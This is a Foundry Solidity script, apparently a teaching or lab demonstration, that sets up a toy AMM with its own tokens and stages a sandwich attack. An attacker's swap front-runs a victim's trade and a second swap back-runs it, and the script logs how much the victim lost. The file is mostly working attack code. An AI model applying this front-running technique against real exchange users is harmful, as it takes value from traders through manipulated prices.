// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";
import {SimpleAMM} from "../src/SimpleAMM.sol";

contract SandwichScript is Script {
    function run() external {
        uint256 pkLp = vm.envUint("PK_LP");
        uint256 pkVictim = vm.envUint("PK_VICTIM");
        uint256 pkAttacker = vm.envUint("PK_ATTACKER");
        address victim = vm.addr(pkVictim);
        address attacker = vm.addr(pkAttacker);

        // 1) Deploy e liquidez
        vm.startBroadcast(pkLp);
        Token tA = new Token("Token A", "TKA");
        Token tB = new Token("Token B", "TKB");
        SimpleAMM amm = new SimpleAMM(address(tA), address(tB));
        tA.mint(vm.addr(pkLp), 1_000_000e18);
        tB.mint(vm.addr(pkLp), 1_000_000e18);
        tA.approve(address(amm), type(uint256).max);
        tB.approve(address(amm), type(uint256).max);
        amm.addLiquidity(1_000_000e18, 1_000_000e18);
        tA.mint(victim, 50_000e18);
        tA.mint(attacker, 20_000e18);
        vm.stopBroadcast();

        vm.startBroadcast(pkVictim);
        tA.approve(address(amm), type(uint256).max);
        vm.stopBroadcast();

        vm.startBroadcast(pkAttacker);
        tA.approve(address(amm), type(uint256).max);
        tB.approve(address(amm), type(uint256).max);
        vm.stopBroadcast();

        uint256 victimIn = 50_000e18;
        uint256 attackerIn = 20_000e18;
        uint256 fair = amm.getAmountOut(victimIn, amm.reserve0(), amm.reserve1());
        uint256 minOut = (fair * 95) / 100;

        console.log("TokenA:", address(tA));
        console.log("TokenB:", address(tB));
        console.log("AMM:   ", address(amm));
        console.log("Atacante TKA antes:", tA.balanceOf(attacker) / 1e18);

        // 2) FRONT-RUN
        vm.startBroadcast(pkAttacker);
        uint256 gotB = amm.swap(address(tA), attackerIn, 0);
        vm.stopBroadcast();

        // 3) Transacao da vitima
        vm.startBroadcast(pkVictim);
        uint256 victimOut = amm.swap(address(tA), victimIn, minOut);
        vm.stopBroadcast();

        // 4) BACK-RUN
        vm.startBroadcast(pkAttacker);
        amm.swap(address(tB), gotB, 0);
        vm.stopBroadcast();

        console.log("Vitima receberia (sem ataque), TKB:", fair / 1e18);
        console.log("Vitima recebeu (com ataque), TKB:  ", victimOut / 1e18);
        console.log("Atacante TKA depois:", tA.balanceOf(attacker) / 1e18);
    }
}